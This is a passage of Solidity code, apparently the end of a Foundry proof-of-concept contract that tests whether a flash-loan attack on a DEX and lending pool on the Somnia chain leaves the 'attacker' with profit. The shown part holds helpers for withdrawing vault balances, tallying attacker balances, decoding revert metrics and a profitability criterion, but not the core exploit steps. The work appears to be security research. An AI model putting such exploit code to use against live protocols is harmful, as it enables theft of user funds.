        if (base == NATIVE || base == address(0)) return 18;
        return IERC20(base).decimals();
    }

    function _quoteDecimals(address pool) internal view returns (uint8) {
        return IERC20(_quoteOf(pool)).decimals();
    }

    function _baseOf(address pool) internal view returns (address base) {
        (base,,,,,,) = IDreamDexSpotPool(pool).getPoolParams();
    }

    function _quoteOf(address pool) internal view returns (address quote) {
        (, quote,,,,,) = IDreamDexSpotPool(pool).getPoolParams();
    }

    function _limitPrice(uint256 best, bool isBid, uint256 bps, uint256 tick) internal pure returns (uint256) {
        uint256 raw = (best * bps) / BPS;
        uint256 limit = isBid ? ((raw + tick - 1) / tick) * tick : (raw / tick) * tick;
        require(limit > 0, "zero limit price");
        return limit;
    }

    function _bestPrice(address pool, bool isBid) internal view returns (uint256) {
        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(pool).getBookLevels(isBid, 1);
        return levels.length == 0 ? 0 : levels[0].price;
    }

    /// @dev Pull a token the pool credited to our internal vault into the wallet.
    function _withdrawVault(address pool, address token) internal {
        uint256 vaulted = IDreamDexSpotPool(pool).getWithdrawableBalance(address(this), token);
        if (vaulted == 0) return;
        console2.log("withdrawing vault balance", token);
        console2.log("  amount", vaulted);
        IDreamDexSpotPool(pool).withdraw(token, vaulted);
    }

    function _approve(address token, address spender, uint256 amount) internal {
        require(IERC20(token).approve(spender, amount), "approve failed");
    }

    /// @dev Liquid balances at the moment of failure. On a repayment shortfall the transaction
    ///      reverts, so `_finish` never runs; without this the report would show zero leftovers.
    /// @dev Attacker's walk-away value in base currency: liquid balances only. This deliberately
    ///      excludes the supplied collateral (the lender seizes it) and excludes the debt, so it
    ///      is the amount that survives if the position is abandoned.
    function _recordLiquidValue() internal {
        m.attackerLiquidBase = _toBase(USDSO, m.finalUsdso, 18) + _toBase(USDC, m.finalUsdc, 6)
            + _toBase(WETH, m.finalWeth, 18) + _toBase(WBTC, m.finalWbtc, 8)
            + _toBase(WSOMI, m.finalWsomi, 18) + _toBase(NATIVE, m.finalNative, 18);
        m.seededBase = seededBase;
        m.zeroSeed = seededBase == 0;
        console2.log("attacker liquid value base (excludes collateral/debt)", m.attackerLiquidBase);
        console2.log("seeded base", m.seededBase);
    }

    function _recordLiquid() internal {
        m.finalUsdso = IERC20(USDSO).balanceOf(address(this));
        m.finalUsdc = IERC20(USDC).balanceOf(address(this));
        m.finalWeth = IERC20(WETH).balanceOf(address(this));
        m.finalWbtc = IERC20(WBTC).balanceOf(address(this));
        m.finalWsomi = IERC20(WSOMI).balanceOf(address(this));
        m.finalNative = address(this).balance;
    }

    function _finish() internal {
        _stage("final");
        // Reaching this point means flashLoanSimple returned, i.e. the Pool successfully pulled
        // amount + premium. There is no cheaper re-derivation of the flag.
        m.repaid = true;
        _recordLiquid();
        _recordLiquidValue();
        console2.log("FINAL USDso", m.finalUsdso);
        console2.log("FINAL USDC", m.finalUsdc);
        console2.log("FINAL WETH", m.finalWeth);
        console2.log("FINAL WBTC", m.finalWbtc);
        console2.log("FINAL WSOMI", m.finalWsomi);
        console2.log("FINAL native", m.finalNative);
        emit MetricsRecorded(abi.encode(m));
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Views for the test harness
    // ─────────────────────────────────────────────────────────────────────────────

    function metrics() external view returns (SomniaMetrics memory) {
        return m;
    }

    function metricsBytes() external view returns (bytes memory) {
        return abi.encode(m);
    }

    /// @notice Shared with the test harness so an offline unit test can prove the revert path
    ///         really carries the metrics, instead of trusting a duplicated decoder.
    function decodeShortfall(bytes memory reason) public pure returns (bool ok, SomniaMetrics memory decoded) {
        if (reason.length < 4) return (false, decoded);
        bytes4 sel;
        assembly {
            sel := mload(add(reason, 32))
        }
        bytes memory body = new bytes(reason.length - 4);
        for (uint256 i; i < body.length; ++i) body[i] = reason[i + 4];
        if (sel == Shortfall.selector) {
            decoded = abi.decode(abi.decode(body, (bytes)), (SomniaMetrics));
            return (true, decoded);
        }
        if (sel == Aborted.selector) {
            (bytes memory payload,) = abi.decode(body, (bytes, bytes));
            decoded = abi.decode(payload, (SomniaMetrics));
            return (true, decoded);
        }
        return (false, decoded);
    }

    /// @notice The single profit criterion used by every report and by the sweep summary.
    ///
    ///         Requires all three, in this order:
    ///           1. the Pool actually pulled amount + premium (the flash is repaid);
    ///           2. the run started with nothing (seededBase == 0) — a funded run proves nothing;
    ///           3. the liquid value still owned exceeds the seed, so anything left over was
    ///              produced by the transaction itself.
    ///         Abandoned collateral, outstanding debt, bad debt and gross borrow are never
    ///         counted as liquid value.
    function isProfitable(SomniaMetrics memory x) public pure returns (bool) {
        if (!x.repaid) return false;
        if (!x.zeroSeed) return false;
        return x.attackerLiquidBase > x.seededBase;
    }
}
